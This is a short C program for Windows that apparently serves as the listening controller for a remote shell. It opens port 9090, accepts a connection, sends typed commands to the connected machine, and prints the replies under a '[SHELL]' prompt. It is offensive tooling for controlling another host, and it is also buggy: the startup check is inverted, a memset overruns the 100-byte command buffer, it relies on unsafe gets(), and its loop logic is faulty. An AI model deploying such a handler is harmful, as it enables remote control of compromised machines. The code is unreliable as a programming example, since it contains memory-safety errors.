#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

int main() {
	// wsa informatin
	WSADATA wsadata;
	WORD dllVersion = MAKEWORD(2, 2);
	if(WSAStartup(dllVersion, &wsadata)) {
		printf("WSA Data is created\n");	
	} else {
		printf("WSA Data is not created\n");
	}
	int sockfd, bindfd, listenfd, acceptfd, sendfd, recvfd;
	char buffer[10000], command[100];
	sockfd = socket(AF_INET, SOCK_STREAM, 0);


	// defining server structure
	struct sockaddr_in address;
	memset(&address, '\0', sizeof(address));
	address.sin_family = AF_INET;
	address.sin_port = htons(9090);
	address.sin_addr.s_addr = inet_addr("0.0.0.0");
	if(sockfd < 0) {
		printf("there is an error while creating a socket descriptor error: %d\n", GetLastError());
	} else {
		printf("Socket is created!\n");
		bindfd = bind(sockfd, (struct sockaddr*)&address, sizeof(address));
		if(bindfd < 0) {
			printf("There is an error while binding your address\n");
		} else {
			printf("Bind is successfull\n");
			listenfd = listen(sockfd, 5);
			if(listenfd < 0) {
				printf("There is an error while listen for connections\n");
			} else {
				printf("listening for incoming connections...\n");
				int size = sizeof(address);
				acceptfd = accept(sockfd, (struct sockaddr*)&address, &size);
				if(acceptfd < 0) {
					printf("There is an error while accepting a connection\n");
				} else {
					printf("Connection is being accepted!\n");
					memset(&buffer, '\0', sizeof(buffer));
					memset(&command, '\0', sizeof(buffer));
				shell:
					printf("\n");	
					printf("[SHELL]:~ ");
					gets(command);
					sendfd = send(acceptfd, command, 100, 0);
					while(1) {
						if(sendfd < 0) {
							printf("there is an error while sending your command\n");
						}
						recvfd = recv(acceptfd, buffer, 10000, 0);
						printf("%s", buffer);
						if(strcmp(buffer, "\0") == 0) {
							goto shell;
						}
					}
				}
			}
		}
	}
	return 0;
}
